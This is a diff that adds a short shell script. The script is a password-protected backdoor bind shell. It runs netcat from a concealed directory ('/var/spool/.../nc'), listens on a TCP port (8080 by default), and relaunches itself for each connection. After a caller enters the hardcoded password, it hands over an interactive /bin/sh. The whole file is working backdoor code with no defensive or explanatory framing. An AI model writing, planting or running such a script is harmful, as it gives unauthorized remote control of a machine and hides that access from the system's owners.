@@ -1,0 +1,24 @@
+#!/bin/sh
+
+NC="/var/spool/.../nc"
+SHELL="/bin/sh"
+PW="st4rl1ght"
+PORT=8080
+
+export PW PORT
+
+if [ $1 ] ; then
+        PORT=$1
+fi
+
+echo "-l -p $PORT -e $0" | $NC 2>/dev/null &
+[ $1 ] && exit;
+
+unset p
+until [ "$p" = "$PW" ]; do
+        echo -n "pass:"
+        read p
+done
+
+# got a good password, launch the shell... 
+$SHELL -i
